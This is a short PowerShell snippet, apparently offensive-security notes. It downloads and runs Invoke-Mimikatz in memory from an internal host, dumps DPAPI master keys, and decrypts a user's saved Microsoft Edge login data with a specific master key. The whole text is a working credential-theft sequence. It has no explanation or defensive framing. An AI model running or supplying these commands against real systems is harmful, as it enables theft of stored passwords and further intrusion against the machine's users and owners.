```powershell
iex (New-Object Net.Webclient).DownloadString("http://10.0.10.18/Invoke-Mimikatz.ps1")

# Dump DPAPI Keys
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::dpapi"'

# Dump Edge Data and decrpyting them
Invoke-Mimikatz -Command '"privilege::debug" "dpapi::chrome /in:C:\Users\terminaluser\AppData\Local\Microsoft\Edge\USERDA~1\Default\LOGIND~1 /unprotect /masterkey:82c12eef02128963851f5be8c907e8f305b4380ca0caa18ba2f3d625435c1970e3695d4333a9d3ce8736a569eb435560033e1f3b527f069ddef35ca80e0bea6e"'
```